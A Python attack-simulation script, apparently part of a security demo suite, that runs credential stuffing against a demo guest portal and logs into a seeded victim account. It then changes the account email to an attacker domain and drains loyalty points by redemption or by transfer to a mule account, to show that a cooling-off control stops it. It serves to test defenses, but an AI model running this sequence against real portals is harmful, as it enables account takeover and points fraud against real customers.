"""Scenario 2: loyalty account takeover via credential stuffing, then points cash-out.

Chain: burst of failed guest-portal logins from one IP -> success on a reused password ->
email changed to an attacker domain -> immediate redemption / transfer to a mule account.

Control that stops it: loyalty_cooling_off. Response action: /control/loyalty/freeze.
"""

import random

from common import ATTACKER_UA, base_args, blocked, detail, load_seed, make_client, ok, step, warn


def main():
    parser = base_args(__doc__)
    parser.add_argument("--ip", default="45.83.64.12")
    parser.add_argument("--attempts", type=int, default=15, help="failed stuffing attempts before the hit")
    args = parser.parse_args()
    seed = load_seed(args.seed)
    victim = seed["demo_targets"]["loyalty_victim"]
    mule = seed["demo_targets"]["loyalty_mule_account"]

    bot = make_client(args.base, ip=args.ip, user_agent=ATTACKER_UA)
    step(f"Credential stuffing: {args.attempts} combos from a breached list against the guest portal")
    rng = random.Random(7)
    for i in range(args.attempts):
        email = f"user{rng.randint(1000, 99999)}@{rng.choice(['example.com', 'example.net', 'mail.example'])}"
        bot.post("/portal/login", json={"email": email, "password": rng.choice(["Password1", "Welcome@123", "India@2024"])})
    ok(f"{args.attempts} failed attempts sent")

    r = bot.post("/portal/login", json={"email": victim["email"], "password": victim["password"]})
    if r.status_code != 200:
        blocked(f"victim login failed: {detail(r)}")
        return
    bot.headers["Authorization"] = f"Bearer {r.json()['access_token']}"
    me = bot.get("/portal/me").json()
    ok(f"HIT: logged into loyalty account {me['id']} ({me['tier']}, {me['points']:,} points)")

    new_email = f"recovery.{rng.randint(100, 999)}@attacker-mail.example"
    r = bot.post("/portal/change-email", json={"new_email": new_email})
    ok(f"Changed account email to {new_email} (locks the real owner out)") if r.status_code == 200 else warn(f"email change failed: {r.text}")

    points = int(me["points"] * 0.9)
    step(f"Redeeming {points:,} points for gift vouchers")
    r = bot.post("/portal/redeem", json={"points": points, "description": "Gift vouchers x10"})
    if r.status_code == 200:
        warn(f"DRAINED {points:,} points via redemption")
        return
    blocked(f"redemption: {detail(r).get('reason')} ({detail(r).get('code')})")

    step(f"Trying a transfer to mule account {mule} instead")
    r = bot.post("/portal/transfer", json={"to_account_id": mule, "points": points})
    if r.status_code == 200:
        warn(f"TRANSFERRED {points:,} points to {mule}")
    else:
        blocked(f"transfer: {detail(r).get('reason')} ({detail(r).get('code')})")


if __name__ == "__main__":
    main()
